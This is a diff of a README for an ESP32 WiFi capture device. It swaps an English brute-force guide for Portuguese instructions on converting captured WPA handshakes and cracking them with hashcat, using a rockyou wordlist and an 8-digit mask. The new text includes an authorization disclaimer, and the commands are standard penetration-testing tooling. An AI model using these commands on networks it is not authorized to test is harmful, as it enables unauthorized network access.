@@ -73,32 +73,40 @@ ESP32-Chimera-Core 1.5.2 and M5Stack-SD-Updater 1.2.8 in `platformio.ini`.
 
 
 
-# How guess the WiFi password using brute force attack
+# Utilização das capturas
 
-**Note:** Cracking an WiFi password using brute force attack for a long WiFi password without GPUs or Cloud help, will be a nightmare but if the password is short or you know the key pattern it will be "easily" cracked. 
+Use estes comandos apenas em redes e arquivos para os quais você possui autorização.
 
-Here is a Linux (Ubuntu) guide for reviewing capture files stored on the Fox WiFi SD card with your computer.
+## Converter PCAP
 
-First we need to install **hashcat**
+```sh
+tshark -r 0006.pcap -w 0006_novo.pcapng -F pcapng
+sudo hcxpcapngtool -o hash_total2.txt 0006_novo.pcapng
+```
 
-<pre>
- sudo apt-get update
- sudo apt install hashcat
-</pre>
+## Verificar EAPOL
 
-EAPOL/PMKID stored on the SD-Card are *pcap* files, we have to convert to *hccapx* format to work with hashcat. In terminal from the directory were we have the *pcap* file from the SD-CARD:
+```sh
+tshark -r 0006.pcap -Y "eapol"
+```
 
-<pre>
- wget https://raw.githubusercontent.com/hashcat/hashcat-utils/master/src/cap2hccapx.c
- gcc -o cap2hccapx cap2hccapx.c
- ./cap2hccapx 1.pcap 1.hccapx
-</pre>
+## Conversão para Hashcat
 
-For example if we know that the wifi password has a lenght of 8 digits we can run the following command, and in few seconds we will have the WiFi Password :)
+```sh
+hcxpcapngtool -o hash_total.txt arquivo_captura.pcapng
+```
 
-<pre>
- hashcat --force -m 2500 -a 3 -1 ?d -o cracked 1.hccapx ?1?1?1?1?1?1?1?1
-</pre>
+## Hashcat
+
+```sh
+hashcat -m 22000 -a 0 hash_total.txt /usr/share/wordlists/rockyou.txt
+```
+
+## Hashcat — 8 dígitos
+
+```sh
+hashcat -m 22000 -a 3 01-hash/hash_total.txt "?d?d?d?d?d?d?d?d"
+```
 
 
 
